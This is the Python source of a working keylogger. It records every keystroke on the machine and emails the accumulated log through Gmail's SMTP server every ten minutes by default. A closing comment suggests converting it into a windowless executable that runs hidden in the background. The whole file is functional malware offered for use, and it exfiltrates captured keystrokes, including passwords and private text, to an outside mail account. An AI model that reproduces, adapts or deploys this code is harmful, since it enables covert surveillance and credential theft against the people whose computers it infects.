import smtplib
import sys
import argparse
import keyboard
# Semaphore to block the thread
# Timer to run a method after a particular interval of time
from threading import Semaphore, Timer


class Keylogger:
    def __init__(self, interval):
        # time interval
        self.interval = interval
        # log of key strokes
        self.log = ""
        # semaphore state
        self.semaphore = Semaphore(0)

    def callback(self, event):
        # this method is called on every keystroke
        name = event.name
        if len(name) > 1:
            if name == "space":
                # replace space with " "
                name = " "
            elif name == "enter":
                # replace enter with "[ENTER]\n"
                name = "[ENTER]\n"
            elif name == "decimal":
                # replace decimal with "."
                name = "."
            else:
                # for other events like CTRL, SHIFT, etc
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def sendmail(self, email, password, message=None):
        # manages a connection with SMTP (Simple Mail Transfer Protocol) server of google
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connects to SMTP as TLS (Transport Layer Security) mode
        server.starttls()
        # login details
        server.login(email, password)
        if message is not None:
            # send actual message
            server.sendmail(email, email, message)
        # terminates the connection
        server.quit()

    def report(self):
        # gets called after every "self.interval"
        if self.log:
            self.sendmail(EMAIL, PASSWORD, self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        print("Keylogging started...")
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()


if __name__ == "__main__":
    global EMAIL
    global PASSWORD
    global TIME_INTERVAL

    # argument parser for command line arguments
    parser = argparse.ArgumentParser(description="Keylogger (Keylogs to Gmail Account)")
    parser.add_argument("email", help="email id of receiver")
    parser.add_argument("password", help="password of receiver's id")
    parser.add_argument("-t", "--time", type=int, dest="time", default="600", help="time interval (in sec) of mails, default=600")

    args = parser.parse_args()
    EMAIL, PASSWORD, TIME_INTERVAL = args.email, args.password, args.time

    keylogger = Keylogger(interval=TIME_INTERVAL)

    # try to login using credentials
    try:
        keylogger.sendmail(EMAIL, PASSWORD)
    except:
        print("Error!\n1. Slow or No Internet\n2. Incorrect Email or Password")
        print("3. \"ACCESS TO LESS SECURE APPS\" is turned off in Gmail account")
        sys.exit(1)

    # start the main working
    keylogger.start()


# convert to window based exe with auto-py-to-exe
# and run in background